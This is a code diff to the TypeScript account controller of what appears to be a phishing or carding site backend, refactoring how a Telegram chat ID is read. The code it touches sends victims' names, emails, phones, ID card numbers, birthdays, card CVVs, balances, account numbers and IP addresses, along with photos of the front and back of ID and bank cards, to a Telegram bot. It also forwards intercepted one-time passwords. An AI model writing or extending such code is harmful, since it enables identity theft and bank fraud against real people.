@@ -6,6 +6,7 @@ import dotenv from "dotenv";
 dotenv.config();
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
 const bot = new TelegramBot(TOKEN, { polling: false });
 
 export class AccountController {
@@ -73,13 +74,13 @@ export class AccountController {
 
       await Promise.allSettled([
         bot.sendMessage(
-          process.env.TELEGRAM_CHAT_ID,
+          CHAT_ID,
           `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
         ),
-        frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard),
-        backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard),
-        frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard),
-        backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard),
+        frontIdCard && bot.sendPhoto(CHAT_ID, frontIdCard),
+        backIdCard && bot.sendPhoto(CHAT_ID, backIdCard),
+        frontCard && bot.sendPhoto(CHAT_ID, frontCard),
+        backCard && bot.sendPhoto(CHAT_ID, backCard),
       ]).catch((err) => {
         console.log("err", err.message);
       });
@@ -138,10 +139,7 @@ export class AccountController {
       io.emit("updateOTP", result);
 
       bot
-        .sendMessage(
-          process.env.TELEGRAM_CHAT_ID,
-          `OTP: ${otp}\nName: ${result?.name}`
-        )
+        .sendMessage(CHAT_ID, `OTP: ${otp}\nName: ${result?.name}`)
         .catch((err: any) => {
           console.log("err", err.message);
         });
